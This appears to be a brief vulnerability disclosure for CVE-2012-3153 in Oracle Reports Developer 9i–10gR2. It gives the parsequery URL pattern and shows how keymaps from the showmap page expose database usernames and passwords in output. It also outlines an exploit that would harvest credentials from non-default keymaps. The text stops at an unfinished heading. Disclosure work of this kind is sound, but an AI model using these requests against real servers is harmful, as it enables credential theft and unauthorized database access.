http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-3153

Oracle Reports Developer – Version 9.0.2.0 to 10.1.2.3 [Release 9i to 10gr2]

Information in this document applies to any platform.
9iAS, 9iDS, 10G (DS and AS), and 10G AS Reports/Forms Standalone Installation

An undocumented function of the PARSEQUERY function allows you to take keymaps that are located in /reports/rwservlet/showmap and add them to the query which will allow you to dump the database passwords.

http://server:port/reports/rwservlet/parsequery?<keymap>

Results

•Original Query String(GET) :

<keymap>

•Result Reports Server Command Line

expiredays=0 report=”<keymap>.rdf” jobname=”<keymap>.rdf” desformat=HTML authid=RWUser/ destype=cache userid=account/password@database

An exploit could be written to first check the showmap file and parse the non default keymaps then run queries to grab credentials that could then be used to access various applications and/or databases.

Default keymap values that do not return passwords
